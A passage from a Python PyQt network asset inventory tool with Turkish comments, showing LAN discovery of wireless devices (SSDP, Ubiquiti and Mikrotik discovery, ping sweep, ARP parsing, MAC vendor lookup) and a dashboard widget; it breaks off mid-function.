    
    def scan_ssdp(self):
        """SSDP (Simple Service Discovery Protocol) taraması"""
        count = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(self.timeout)
            
            # SSDP M-SEARCH mesajı
            ssdp_request = (
                "M-SEARCH * HTTP/1.1\r\n"
                "HOST: 239.255.255.250:1900\r\n"
                "MAN: \"ssdp:discover\"\r\n"
                "MX: 2\r\n"
                "ST: ssdp:all\r\n\r\n"
            ).encode()
            
            # Multicast gönder
            sock.sendto(ssdp_request, ("239.255.255.250", 1900))
            
            # Broadcast da gönder
            try:
                sock.sendto(ssdp_request, ("255.255.255.255", 1900))
            except:
                pass
            
            # Yanıtları topla
            start_time = time.time()
            while time.time() - start_time < self.timeout * 2:
                if self._stop:
                    break
                try:
                    data, addr = sock.recvfrom(4096)
                    ip = addr[0]
                    if ip not in self.found_devices:
                        device = self.parse_ssdp_response(data.decode('utf-8', errors='ignore'), ip)
                        if device and self.is_wireless_device(device):
                            self.found_devices[ip] = device
                            self.device_found.emit(device)
                            count += 1
                except socket.timeout:
                    break
                except:
                    continue
            
            sock.close()
        except Exception as e:
            self.progress.emit(f"⚠️ SSDP hata: {str(e)}")
        
        return count
    
    def parse_ssdp_response(self, data, ip):
        """SSDP yanıtını parse et"""
        device = AntennaDevice(ip=ip, protocol="SSDP", last_seen=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        
        lines = data.split('\r\n')
        for line in lines:
            line_lower = line.lower()
            if line_lower.startswith('server:'):
                device.model = line.split(':', 1)[1].strip()
            elif line_lower.startswith('location:'):
                device.raw_data['location'] = line.split(':', 1)[1].strip()
            elif 'usn:' in line_lower:
                device.raw_data['usn'] = line.split(':', 1)[1].strip()
        
        # MAC adresini al
        device.mac = self.get_mac_from_ip(ip)
        if device.mac:
            vendor_info = self.get_vendor_from_mac(device.mac)
            if vendor_info:
                device.vendor, device.device_type = vendor_info
        
        return device
    
    def scan_ubiquiti(self):
        """Ubiquiti cihaz keşfi (UDP 10001)"""
        count = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(self.timeout)
            
            # Ubiquiti Discovery paketi (v1)
            ubnt_packet = bytes([0x01, 0x00, 0x00, 0x00])
            
            try:
                sock.sendto(ubnt_packet, ("255.255.255.255", 10001))
            except:
                pass
            
            start_time = time.time()
            while time.time() - start_time < self.timeout * 2:
                if self._stop:
                    break
                try:
                    data, addr = sock.recvfrom(4096)
                    ip = addr[0]
                    if ip not in self.found_devices:
                        device = self.parse_ubiquiti_response(data, ip)
                        if device:
                            self.found_devices[ip] = device
                            self.device_found.emit(device)
                            count += 1
                except socket.timeout:
                    break
                except:
                    continue
            
            sock.close()
        except Exception as e:
            self.progress.emit(f"⚠️ Ubiquiti hata: {str(e)}")
        
        return count
    
    def parse_ubiquiti_response(self, data, ip):
        """Ubiquiti yanıtını parse et"""
        device = AntennaDevice(
            ip=ip, 
            protocol="UBNT", 
            vendor="Ubiquiti",
            device_type="antenna",
            last_seen=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        )
        
        try:
            # TLV formatını parse et
            offset = 4  # İlk 4 byte header
            while offset < len(data) - 2:
                tlv_type = data[offset]
                tlv_len = data[offset + 1]
                tlv_data = data[offset + 2:offset + 2 + tlv_len]
                
                if tlv_type == 0x01:  # MAC
                    device.mac = ':'.join(f'{b:02X}' for b in tlv_data)
                elif tlv_type == 0x02:  # MAC + IP
                    if len(tlv_data) >= 10:
                        device.mac = ':'.join(f'{b:02X}' for b in tlv_data[:6])
                elif tlv_type == 0x03:  # Firmware
                    device.firmware = tlv_data.decode('utf-8', errors='ignore').strip('\x00')
                elif tlv_type == 0x0B:  # Name
                    device.name = tlv_data.decode('utf-8', errors='ignore').strip('\x00')
                elif tlv_type == 0x0C:  # Model Short
                    device.model = tlv_data.decode('utf-8', errors='ignore').strip('\x00')
                elif tlv_type == 0x14:  # Model Long
                    if not device.model:
                        device.model = tlv_data.decode('utf-8', errors='ignore').strip('\x00')
                elif tlv_type == 0x15:  # Uptime
                    if len(tlv_data) >= 4:
                        uptime_secs = struct.unpack('>I', tlv_data[:4])[0]
                        days, rem = divmod(uptime_secs, 86400)
                        hours, rem = divmod(rem, 3600)
                        mins, secs = divmod(rem, 60)
                        device.uptime = f"{days}d {hours}h {mins}m"
                
                offset += 2 + tlv_len
        except:
            pass
        
        return device
    
    def scan_mikrotik(self):
        """Mikrotik cihaz keşfi (UDP 5678)"""
        count = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(self.timeout)
            
            # Mikrotik MNDP paketi
            mndp_packet = bytes([0x00, 0x00, 0x00, 0x00])
            
            try:
                sock.sendto(mndp_packet, ("255.255.255.255", 5678))
            except:
                pass
            
            start_time = time.time()
            while time.time() - start_time < self.timeout * 2:
                if self._stop:
                    break
                try:
                    data, addr = sock.recvfrom(4096)
                    ip = addr[0]
                    if ip not in self.found_devices:
                        device = self.parse_mikrotik_response(data, ip)
                        if device:
                            self.found_devices[ip] = device
                            self.device_found.emit(device)
                            count += 1
                except socket.timeout:
                    break
                except:
                    continue
            
            sock.close()
        except Exception as e:
            self.progress.emit(f"⚠️ Mikrotik hata: {str(e)}")
        
        return count
    
    def parse_mikrotik_response(self, data, ip):
        """Mikrotik yanıtını parse et"""
        device = AntennaDevice(
            ip=ip,
            protocol="MNDP",
            vendor="Mikrotik",
            device_type="router",
            last_seen=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        )
        
        try:
            # TLV parse
            offset = 0
            while offset < len(data) - 4:
                tlv_type = struct.unpack('<H', data[offset:offset+2])[0]
                tlv_len = struct.unpack('<H', data[offset+2:offset+4])[0]
                tlv_data = data[offset+4:offset+4+tlv_len]
                
                if tlv_type == 1:  # MAC
                    device.mac = ':'.join(f'{b:02X}' for b in tlv_data)
                elif tlv_type == 5:  # Identity
                    device.name = tlv_data.decode('utf-8', errors='ignore')
                elif tlv_type == 7:  # Version
                    device.firmware = tlv_data.decode('utf-8', errors='ignore')
                elif tlv_type == 8:  # Platform
                    device.model = tlv_data.decode('utf-8', errors='ignore')
                elif tlv_type == 10:  # Uptime
                    if len(tlv_data) >= 4:
                        uptime_secs = struct.unpack('<I', tlv_data[:4])[0]
                        days, rem = divmod(uptime_secs, 86400)
                        hours, rem = divmod(rem, 3600)
                        mins, secs = divmod(rem, 60)
                        device.uptime = f"{days}d {hours}h {mins}m"
                elif tlv_type == 11:  # Software ID
                    device.raw_data['software_id'] = tlv_data.decode('utf-8', errors='ignore')
                elif tlv_type == 12:  # Board
                    if not device.model:
                        device.model = tlv_data.decode('utf-8', errors='ignore')
                
                offset += 4 + tlv_len
        except:
            pass
        
        return device
    
    def scan_tinax(self):
        """Tinax anten keşfi (UDP 6239)"""
        count = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(self.timeout)
            
            # Tinax discovery paketi (tahmin edilen format)
            tinax_packet = bytes([0x54, 0x49, 0x4E, 0x41, 0x58, 0x00])  # "TINAX\0"
            
            try:
                sock.sendto(tinax_packet, ("255.255.255.255", 6239))
            except:
                pass
            
            start_time = time.time()
            while time.time() - start_time < self.timeout * 2:
                if self._stop:
                    break
                try:
                    data, addr = sock.recvfrom(4096)
                    ip = addr[0]
                    if ip not in self.found_devices:
                        device = AntennaDevice(
                            ip=ip,
                            protocol="TINAX",
                            vendor="Tinax",
                            device_type="bridge",
                            last_seen=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        )
                        device.mac = self.get_mac_from_ip(ip)
                        device.raw_data['response'] = data.hex()
                        self.found_devices[ip] = device
                        self.device_found.emit(device)
                        count += 1
                except socket.timeout:
                    break
                except:
                    continue
            
            sock.close()
        except Exception as e:
            self.progress.emit(f"⚠️ Tinax hata: {str(e)}")
        
        return count
    
    def scan_ip_range(self):
        """IP aralığı taraması - HTTP/HTTPS web arayüzü kontrolü"""
        count = 0
        
        try:
            # IP aralığını parse et
            if '-' in self.ip_range:
                base, end = self.ip_range.rsplit('.', 1)[0], self.ip_range
                start_ip, end_range = self.ip_range.rsplit('-', 1)
                base = start_ip.rsplit('.', 1)[0]
                start = int(start_ip.rsplit('.', 1)[1])
                end = int(end_range)
            else:
                base = self.ip_range.rsplit('.', 1)[0]
                start, end = 1, 254
            
            # Web arayüzü olan kablosuz cihazları tara
            wireless_ports = [80, 443, 8080, 8443]
            
            def check_ip(ip):
                if self._stop:
                    return None
                    
                # Önce ping kontrolü
                try:
                    if platform.system() == "Windows":
                        cmd = ["ping", "-n", "1", "-w", "500", ip]
                    else:
                        cmd = ["ping", "-c", "1", "-W", "1", ip]
                    result = run_command(cmd, timeout=2)
                    if result.returncode != 0:
                        return None
                except:
                    return None
                
                # MAC adresini al
                mac = self.get_mac_from_ip(ip)
                if not mac:
                    return None
                
                # Kablosuz cihaz mı kontrol et
                vendor_info = self.get_vendor_from_mac(mac)
                if not vendor_info:
                    return None
                
                vendor, dev_type = vendor_info
                
                # HTTP başlığı kontrol et
                model = ""
                for port in wireless_ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        if sock.connect_ex((ip, port)) == 0:
                            # HTTP isteği gönder
                            try:
                                sock.send(b"GET / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
                                response = sock.recv(1024).decode('utf-8', errors='ignore')
                                if 'Server:' in response:
                                    for line in response.split('\r\n'):
                                        if line.lower().startswith('server:'):
                                            model = line.split(':', 1)[1].strip()
                                            break
                            except:
                                pass
                        sock.close()
                    except:
                        pass
                
                device = AntennaDevice(
                    ip=ip,
                    mac=mac,
                    vendor=vendor,
                    device_type=dev_type,
                    model=model,
                    protocol="HTTP",
                    last_seen=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                )
                return device
            
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = {executor.submit(check_ip, f"{base}.{i}"): i for i in range(start, end + 1)}
                for future in as_completed(futures):
                    if self._stop:
                        break
                    try:
                        device = future.result()
                        if device and device.ip not in self.found_devices:
                            self.found_devices[device.ip] = device
                            self.device_found.emit(device)
                            count += 1
                    except:
                        pass
        except Exception as e:
            self.progress.emit(f"⚠️ IP tarama hata: {str(e)}")
        
        return count
    
    def scan_arp_table(self):
        """ARP tablosundan kablosuz cihazları tespit et"""
        count = 0
        
        try:
            if platform.system() == "Windows":
                result = run_command(["arp", "-a"], timeout=5)
            else:
                result = run_command(["arp", "-n"], timeout=5)
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if self._stop:
                        break
                    
                    # IP ve MAC adresini çıkar
                    parts = line.split()
                    ip = None
                    mac = None
                    
                    for part in parts:
                        # IP kontrolü
                        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', part):
                            ip = part
                        # MAC kontrolü
                        elif re.match(r'^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$', part):
                            mac = part.upper().replace('-', ':')
                    
                    if ip and mac and ip not in self.found_devices:
                        vendor_info = self.get_vendor_from_mac(mac)
                        if vendor_info:
                            vendor, dev_type = vendor_info
                            device = AntennaDevice(
                                ip=ip,
                                mac=mac,
                                vendor=vendor,
                                device_type=dev_type,
                                protocol="ARP",
                                last_seen=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            )
                            self.found_devices[ip] = device
                            self.device_found.emit(device)
                            count += 1
        except Exception as e:
            self.progress.emit(f"⚠️ ARP hata: {str(e)}")
        
        return count
    
    def get_mac_from_ip(self, ip):
        """IP adresinden MAC adresini al"""
        try:
            # Önce ping at (ARP cache için)
            if platform.system() == "Windows":
                run_command(["ping", "-n", "1", "-w", "500", ip], timeout=2)
            else:
                run_command(["ping", "-c", "1", "-W", "1", ip], timeout=2)
            
            # ARP tablosundan MAC al
            if platform.system() == "Windows":
                result = run_command(["arp", "-a", ip], timeout=2)
            else:
                result = run_command(["arp", "-n", ip], timeout=2)
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    # MAC adresi formatı ara
                    match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}', line)
                    if match:
                        return match.group().upper().replace('-', ':')
        except:
            pass
        return None
    
    def get_vendor_from_mac(self, mac):
        """MAC adresinden vendor bilgisi al (sadece kablosuz cihazlar)"""
        if not mac:
            return None
        
        prefix = mac[:8].upper()
        return WIRELESS_VENDORS.get(prefix)
    
    def is_wireless_device(self, device):
        """Cihazın kablosuz olup olmadığını kontrol et"""
        # MAC vendor kontrolü
        if device.mac:
            vendor_info = self.get_vendor_from_mac(device.mac)
            if vendor_info:
                return True
        
        # Model/vendor string kontrolü
        wireless_keywords = ['wireless', 'wifi', 'wi-fi', 'access point', 'ap', 
                           'router', 'bridge', 'antenna', 'ubiquiti', 'mikrotik',
                           'tinax', 'cambium', 'ruckus', 'aruba', 'unifi']
        
        check_fields = [device.model.lower() if device.model else '',
                       device.vendor.lower() if device.vendor else '',
                       device.name.lower() if device.name else '']
        
        for field in check_fields:
            for keyword in wireless_keywords:
                if keyword in field:
                    return True
        
        return False





# ============= DASHBOARD / ÖZET EKRAN =============

class DashboardWidget(QWidget):
    """Profesyonel Dashboard - Ağ Özet Ekranı"""
    
    def __init__(self, org=None, parent=None):
        super().__init__(parent)
        self.org = org
        self.setup_ui()
        
        # Otomatik yenileme (60 saniye)
        self.refresh_timer = QTimer(self)
        self.refresh_timer.timeout.connect(self.refresh_stats)
        self.refresh_timer.start(60000)
    
    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(8)
        layout.setContentsMargins(10, 10, 10, 10)
        
        # ═══════════════════════════════════════════════════════
        # BAŞLIK SATIRI
        # ═══════════════════════════════════════════════════════
        header = QHBoxLayout()
        title = QLabel("📊 Dashboard")
        title.setStyleSheet("font-size:20px;font-weight:bold;color:#00ff88;")
        header.addWidget(title)
        header.addStretch()
        
        self.last_update = QLabel("")
        self.last_update.setStyleSheet("color:#666;font-size:10px;")
        header.addWidget(self.last_update)
        
        refresh_btn = QPushButton("🔄")
        refresh_btn.setFixedSize(32, 32)
        refresh_btn.setStyleSheet("QPushButton{background:#0f3460;color:white;border:none;border-radius:16px;font-size:14px;}QPushButton:hover{background:#1a5276;}")
        refresh_btn.clicked.connect(self.refresh_stats)
        refresh_btn.setToolTip("Yenile")
        header.addWidget(refresh_btn)
        layout.addLayout(header)
        
        # ═══════════════════════════════════════════════════════
        # ÜST KISIM - 4 İSTATİSTİK KARTI (Kompakt)
        # ═══════════════════════════════════════════════════════
        cards_layout = QHBoxLayout()
        cards_layout.setSpacing(10)
        
        self.card_total = self.create_mini_card("TOPLAM VARLIK", "0", "#00d4ff", "📦")
        self.card_online = self.create_mini_card("ONLINE", "0", "#00ff88", "🟢")
        self.card_offline = self.create_mini_card("OFFLINE", "0", "#e74c3c", "🔴")
        self.card_depts = self.create_mini_card("BİRİMLER", "0", "#f39c12", "🏢")
        
        cards_layout.addWidget(self.card_total)
        cards_layout.addWidget(self.card_online)
        cards_layout.addWidget(self.card_offline)
        cards_layout.addWidget(self.card_depts)
        layout.addLayout(cards_layout)
        
        # ═══════════════════════════════════════════════════════
        # ORTA KISIM - Sol: Cihaz Türleri, Sağ: Birimler
        # ═══════════════════════════════════════════════════════
        middle_layout = QHBoxLayout()
        middle_layout.setSpacing(10)
        
        # --- Cihaz Türü Dağılımı (Progress Bar'lı) ---
        type_frame = QFrame()
        type_frame.setStyleSheet("QFrame{background:#121a2e;border-radius:8px;}")
        type_layout = QVBoxLayout(type_frame)
        type_layout.setContentsMargins(12, 8, 12, 8)
        type_layout.setSpacing(4)
        
        type_header = QHBoxLayout()
        type_title = QLabel("📱 Cihaz Türleri")
        type_title.setStyleSheet("color:#00d4ff;font-size:12px;font-weight:bold;")
        type_header.addWidget(type_title)
        self.type_total = QLabel("0 cihaz")
        self.type_total.setStyleSheet("color:#666;font-size:10px;")
        type_header.addWidget(self.type_total)
        type_layout.addLayout(type_header)
        
        self.type_container = QVBoxLayout()
        self.type_container.setSpacing(3)
        type_layout.addLayout(self.type_container)
        type_layout.addStretch()
        
        middle_layout.addWidget(type_frame)
        
        # --- Birim Dağılımı (Progress Bar'lı) ---
        dept_frame = QFrame()
        dept_frame.setStyleSheet("QFrame{background:#121a2e;border-radius:8px;}")
        dept_layout = QVBoxLayout(dept_frame)
        dept_layout.setContentsMargins(12, 8, 12, 8)
        dept_layout.setSpacing(4)
        
        dept_header = QHBoxLayout()
        dept_title = QLabel("🏢 Birim Dağılımı")
        dept_title.setStyleSheet("color:#f39c12;font-size:12px;font-weight:bold;")
        dept_header.addWidget(dept_title)
        self.dept_total = QLabel("0 birim")
        self.dept_total.setStyleSheet("color:#666;font-size:10px;")
        dept_header.addWidget(self.dept_total)
        dept_layout.addLayout(dept_header)
        
        self.dept_container = QVBoxLayout()
        self.dept_container.setSpacing(3)
        dept_layout.addLayout(self.dept_container)
        dept_layout.addStretch()
        
        middle_layout.addWidget(dept_frame)
        
        # --- Hızlı İşlemler ---
        quick_frame = QFrame()
        quick_frame.setStyleSheet("QFrame{background:#121a2e;border-radius:8px;}")
        quick_frame.setFixedWidth(180)
        quick_layout = QVBoxLayout(quick_frame)
        quick_layout.setContentsMargins(10, 8, 10, 8)
        quick_layout.setSpacing(6)
        
        quick_title = QLabel("⚡ Hızlı İşlemler")
        quick_title.setStyleSheet("color:#9b59b6;font-size:12px;font-weight:bold;")
        quick_layout.addWidget(quick_title)
        
        btn_style = "QPushButton{background:#1a2744;color:white;padding:8px;border:none;border-radius:4px;font-size:10px;text-align:left;}QPushButton:hover{background:#0f3460;border-left:2px solid #00ff88;}"
        
        btn1 = QPushButton("🔍 Ağ Tara")
        btn1.setStyleSheet(btn_style)
        btn1.clicked.connect(self.start_scan)
        quick_layout.addWidget(btn1)
        
        btn2 = QPushButton("➕ Varlık Ekle")
        btn2.setStyleSheet(btn_style)
        btn2.clicked.connect(self.add_asset)
        quick_layout.addWidget(btn2)
        
        btn3 = QPushButton("📤 Excel Export")
        btn3.setStyleSheet(btn_style)
        btn3.clicked.connect(self.export_excel)
        quick_layout.addWidget(btn3)
        
        btn4 = QPushButton("📊 Toplu Ping")
        btn4.setStyleSheet(btn_style)
        btn4.clicked.connect(self.ping_all)
        quick_layout.addWidget(btn4)
        
        quick_layout.addStretch()
        middle_layout.addWidget(quick_frame)
        
        layout.addLayout(middle_layout)
        
        # ═══════════════════════════════════════════════════════
        # ALT KISIM - Sol: Son Varlıklar, Sağ: Uyarılar
        # ═══════════════════════════════════════════════════════
        bottom_layout = QHBoxLayout()
        bottom_layout.setSpacing(10)
        
        # --- Son Eklenen Varlıklar ---
        recent_frame = QFrame()
        recent_frame.setStyleSheet("QFrame{background:#121a2e;border-radius:8px;}")
        recent_layout = QVBoxLayout(recent_frame)
        recent_layout.setContentsMargins(10, 8, 10, 8)
        recent_layout.setSpacing(4)
        
        recent_title = QLabel("🕐 Son Eklenen Varlıklar")
        recent_title.setStyleSheet("color:#00ff88;font-size:12px;font-weight:bold;")
        recent_layout.addWidget(recent_title)
        
        self.recent_table = QTableWidget()
        self.recent_table.setColumnCount(4)
        self.recent_table.setHorizontalHeaderLabels(["Hostname", "IP", "Tür", "Birim"])
        self.recent_table.setStyleSheet("""
            QTableWidget{background:transparent;border:none;color:white;font-size:10px;}
            QTableWidget::item{padding:2px;border-bottom:1px solid #1a2744;}
            QHeaderView::section{background:#1a2744;color:#00d4ff;padding:4px;border:none;font-size:10px;}
        """)
        self.recent_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.recent_table.verticalHeader().setVisible(False)
        self.recent_table.setMaximumHeight(140)
        self.recent_table.setShowGrid(False)
        recent_layout.addWidget(self.recent_table)
        
        bottom_layout.addWidget(recent_frame, 2)
        
        # --- Uyarılar ve Durum ---
        alerts_frame = QFrame()
        alerts_frame.setStyleSheet("QFrame{background:#121a2e;border-radius:8px;}")
        alerts_frame.setFixedWidth(280)
        alerts_layout = QVBoxLayout(alerts_frame)
        alerts_layout.setContentsMargins(10, 8, 10, 8)
        alerts_layout.setSpacing(4)
        
        alerts_title = QLabel("⚠️ Uyarılar")
        alerts_title.setStyleSheet("color:#e74c3c;font-size:12px;font-weight:bold;")
        alerts_layout.addWidget(alerts_title)
        
        self.alerts_container = QVBoxLayout()
        self.alerts_container.setSpacing(4)
        alerts_layout.addLayout(self.alerts_container)
        alerts_layout.addStretch()
        
        bottom_layout.addWidget(alerts_frame)

        # ── Watchdog Son Olaylar Paneli ──────────────────────────────────────
        wd_frame = QFrame()
        wd_frame.setStyleSheet(
            "QFrame{background:#0d0d1a;border:1px solid #9b59b680;"
            "border-radius:10px;padding:4px;}")
        wd_layout = QVBoxLayout(wd_frame)
        wd_layout.setSpacing(4)
        wd_layout.setContentsMargins(8, 6, 8, 6)

        wd_header = QHBoxLayout()
        wd_title = QLabel("🔔 Son Watchdog Olayları")
        wd_title.setStyleSheet("color:#9b59b6;font-weight:bold;font-size:11px;")
        wd_header.addWidget(wd_title)
        wd_header.addStretch()
        wd_open_btn = QPushButton("Tümünü Gör →")
        wd_open_btn.setFixedHeight(20)
        wd_open_btn.setStyleSheet(
            "QPushButton{background:transparent;color:#9b59b6;border:none;"
            "font-size:10px;}QPushButton:hover{color:#d7bde2;}")
        wd_open_btn.clicked.connect(self._open_watchdog_tab)
        wd_header.addWidget(wd_open_btn)
        wd_layout.addLayout(wd_header)

        self.watchdog_table = QTableWidget()
        self.watchdog_table.setColumnCount(3)
        self.watchdog_table.setHorizontalHeaderLabels(["Saat", "Varlık", "Olay"])
        self.watchdog_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Stretch)
        self.watchdog_table.horizontalHeader().setSectionResizeMode(
            0, QHeaderView.ResizeMode.Fixed)
        self.watchdog_table.setColumnWidth(0, 65)
        self.watchdog_table.setEditTriggers(
            QAbstractItemView.EditTrigger.NoEditTriggers)
        self.watchdog_table.verticalHeader().setVisible(False)
        self.watchdog_table.setShowGrid(False)
        self.watchdog_table.setAlternatingRowColors(True)
        self.watchdog_table.setStyleSheet(
            "QTableWidget{background:#0a0a14;border:none;"
            "alternate-background-color:#0d0d1a;}"
            "QHeaderView::section{background:#0a0a14;color:#9b59b6;"
            "padding:3px;font-size:9px;border:none;font-weight:bold;}"
            "QTableWidget::item{padding:2px;font-size:10px;}")
        self.watchdog_table.setFixedHeight(200)
        wd_layout.addWidget(self.watchdog_table)

        bottom_layout.addWidget(wd_frame)
        
        layout.addLayout(bottom_layout)
        
        # İlk yükleme
        QTimer.singleShot(100, self.refresh_stats)
    
    def create_mini_card(self, title, value, color, icon):
        """Kompakt istatistik kartı"""
        card = QFrame()
        card.setStyleSheet(f"""
            QFrame{{
                background: qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 #1a2744,stop:1 #121a2e);
                border-radius:8px;
                border-top:3px solid {color};
            }}
        """)
        card.setMinimumHeight(70)
        card.setMaximumHeight(80)
        
        layout = QVBoxLayout(card)
        layout.setContentsMargins(12, 8, 12, 8)
        layout.setSpacing(2)
        
        # Üst satır: icon + title
        top = QHBoxLayout()
        icon_lbl = QLabel(icon)
        icon_lbl.setStyleSheet("font-size:14px;")
        top.addWidget(icon_lbl)
        title_lbl = QLabel(title)
        title_lbl.setStyleSheet("color:#888;font-size:9px;font-weight:bold;")
        top.addWidget(title_lbl)
        top.addStretch()
        layout.addLayout(top)
        
        # Değer
        value_lbl = QLabel(value)
        value_lbl.setObjectName("value")
        value_lbl.setStyleSheet(f"color:{color};font-size:28px;font-weight:bold;")
        value_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(value_lbl)
        
        return card
    
    def create_progress_row(self, label, count, total, color):
        """Progress bar'lı satır oluştur"""
        widget = QWidget()
        layout = QHBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(8)
        
        # Label
        lbl = QLabel(label)
        lbl.setStyleSheet("color:white;font-size:10px;")
        lbl.setFixedWidth(100)
        layout.addWidget(lbl)
        
        # Progress bar
        pct = int((count / total * 100) if total > 0 else 0)
        progress = QProgressBar()
        progress.setValue(pct)
        progress.setTextVisible(False)
        progress.setFixedHeight(12)
        progress.setStyleSheet(f"""
            QProgressBar{{background:#1a2744;border:none;border-radius:6px;}}
            QProgressBar::chunk{{background:{color};border-radius:6px;}}
        """)
        layout.addWidget(progress)
        
        # Sayı
        count_lbl = QLabel(str(count))
        count_lbl.setStyleSheet(f"color:{color};font-size:10px;font-weight:bold;")
        count_lbl.setFixedWidth(30)
        count_lbl.setAlignment(Qt.AlignmentFlag.AlignRight)
        layout.addWidget(count_lbl)
        
        return widget
    
    def create_alert_item(self, text, color, icon):
        """Uyarı satırı oluştur"""
        widget = QWidget()
        widget.setStyleSheet(f"background:#1a2744;border-radius:4px;border-left:3px solid {color};")
        layout = QHBoxLayout(widget)
        layout.setContentsMargins(8, 4, 8, 4)
        
        lbl = QLabel(f"{icon} {text}")
        lbl.setStyleSheet(f"color:{color};font-size:10px;")
        layout.addWidget(lbl)
        
        return widget
    
    def clear_layout(self, layout):
        """Layout'u temizle"""
        while layout.count():
            item = layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
    
    def update_card(self, card, value):
        """Kart değerini güncelle"""
        value_lbl = card.findChild(QLabel, "value")
        if value_lbl:
            value_lbl.setText(str(value))
    
    def refresh_stats(self):
        """Tüm istatistikleri yenile"""
        if not self.org:
            return
        
        try:
            total_assets = len(self.org.assets)
            total_depts = len(self.org.departments)
            
            # Kartları güncelle
            self.update_card(self.card_total, total_assets)
            self.update_card(self.card_depts, total_depts)
            
            # Online/Offline hesapla
            online = 0
            offline = 0
            for asset in self.org.assets.values():
                if hasattr(asset, 'last_seen') and asset.last_seen:
                    try:
                        last = datetime.strptime(asset.last_seen, "%Y-%m-%d %H:%M:%S")
                        if (datetime.now() - last).seconds < 300:
                            online += 1
                        else:
                            offline += 1
                    except:
                        offline += 1
                else:
                    offline += 1
            
            self.update_card(self.card_online, online)
            self.update_card(self.card_offline, offline)
            
            # Cihaz türleri - progress bar'lı
            self.clear_layout(self.type_container)
            type_counts = {}
            type_icons = {
                'computer': '💻', 'laptop': '💻', 'desktop': '🖥️', 'printer': '🖨️',
                'router': '📡', 'switch': '🔀', 'access_point': '📶', 'ip_camera': '📹',
                'server': '🖥️', 'nas': '💾', 'phone': '📱', 'sensor': '🌡️', 'other': '📦'
            }
            colors = ['#00d4ff', '#00ff88', '#f39c12', '#e74c3c', '#9b59b6', '#3498db', '#1abc9c', '#e91e63']
            
            for asset in self.org.assets.values():
                atype = asset.asset_type or 'other'
                type_counts[atype] = type_counts.get(atype, 0) + 1
            
            self.type_total.setText(f"{total_assets} cihaz")
            
            for i, (atype, count) in enumerate(sorted(type_counts.items(), key=lambda x: -x[1])[:6]):
                icon = type_icons.get(atype, '📦')
                color = colors[i % len(colors)]
                label = f"{icon} {atype.replace('_', ' ').title()}"
                row = self.create_progress_row(label, count, total_assets, color)
                self.type_container.addWidget(row)
            
            # Birim dağılımı - progress bar'lı
            self.clear_layout(self.dept_container)
            self.dept_total.setText(f"{total_depts} birim")
            
            dept_colors = ['#f39c12', '#e74c3c', '#9b59b6', '#3498db', '#00ff88', '#00d4ff']
            
            for i, dept in enumerate(list(self.org.departments.values())[:6]):
                assets = self.org.get_assets(dept.id)
                count = len(assets)
                color = dept_colors[i % len(dept_colors)]
                # Birim adını kısalt
                name = dept.name[:15] + "..." if len(dept.name) > 15 else dept.name
                row = self.create_progress_row(f"🏢 {name}", count, total_assets, color)
                self.dept_container.addWidget(row)
            
            # Birimsiz varlıklar
            no_dept = len([a for a in self.org.assets.values() if not a.department_id])
            if no_dept > 0:
                row = self.create_progress_row("📁 Birimsiz", no_dept, total_assets, "#e74c3c")
                self.dept_container.addWidget(row)
            
            # Son eklenen varlıklar
            self.recent_table.setRowCount(0)
            sorted_assets = sorted(self.org.assets.values(), key=lambda x: x.id, reverse=True)[:6]
            
            for asset in sorted_assets:
                row = self.recent_table.rowCount()
                self.recent_table.insertRow(row)
                
                name = asset.hostname or asset.name or '-'
                if len(name) > 20:
                    name = name[:20] + "..."
                
                self.recent_table.setItem(row, 0, QTableWidgetItem(name))
                self.recent_table.setItem(row, 1, QTableWidgetItem(asset.ip_address or '-'))
                self.recent_table.setItem(row, 2, QTableWidgetItem(asset.asset_type or '-'))
                
                dept_name = '-'
                if asset.department_id:
                    dept = self.org.departments.get(asset.department_id)
                    if dept:
                        dept_name = dept.name[:12] + "..." if len(dept.name) > 12 else dept.name
                self.recent_table.setItem(row, 3, QTableWidgetItem(dept_name))
            
            # Uyarılar
            self.clear_layout(self.alerts_container)
            
            no_ip = len([a for a in self.org.assets.values() if not a.ip_address])
            if no_ip > 0:
                alert = self.create_alert_item(f"{no_ip} varlığın IP adresi yok", "#f39c12", "⚠️")
                self.alerts_container.addWidget(alert)
            
            if no_dept > 0:
                alert = self.create_alert_item(f"{no_dept} varlık birime atanmamış", "#f39c12", "📁")
                self.alerts_container.addWidget(alert)
            
            if total_assets > 0 and offline > total_assets * 0.5:
                pct = int(offline / total_assets * 100)
